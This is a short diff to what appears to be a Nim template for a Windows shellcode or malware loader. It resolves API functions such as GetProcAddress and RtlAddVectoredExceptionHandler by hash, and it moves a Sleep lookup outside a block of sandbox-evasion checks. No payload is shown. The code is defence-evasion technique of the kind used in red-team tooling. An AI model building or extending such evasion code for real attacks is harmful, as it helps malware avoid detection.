@@ -79,7 +79,7 @@ MyGetProcessHeap = cast[GetProcessHeap_t](cast[LPVOID](get_function_address(cast
 
 MyGetProcAddress = cast[GetProcAddress_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetProcAddress_HASH, 0, FALSE)))
 
-MyRtlAddVectoredExceptionHandler = cast[RtlAddVectoredExceptionHandler_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(NTDLL_DLL, TRUE)), RtlAddVectoredExceptionHandler_HASH, 0, FALSE)))
+MyRtlAddVectoredExceptionHandler = cast[RtlAddVectoredExceptionHandler_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(NTDLL_DLL, TRUE)), RtlAddVectoredExceptionHandler_HASH, 0, TRUE)))
 
 MyGetModuleHandleA = cast[GetModuleHandleA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetModuleHandleA_HASH, 0, FALSE)))
 
@@ -97,9 +97,9 @@ MyWaitForSingleObject = cast[WaitForSingleObject_t](cast[LPVOID](get_function_ad
 
 MultiByteToWideChar = cast[MultiByteToWideChar_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), MultiByteToWideChar_HASH, 0, FALSE)))
 
-when not defined(SkipDefaultSandBoxChecks):
-  MySleep = cast[Sleep_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), Sleep_HASH, 0, FALSE)))
+MySleep = cast[Sleep_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), Sleep_HASH, 0, FALSE)))
 
+when not defined(SkipDefaultSandBoxChecks):
   MyGetTickCount = cast[GetTickCount_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetTickCount_HASH, 0, FALSE)))
         
 """
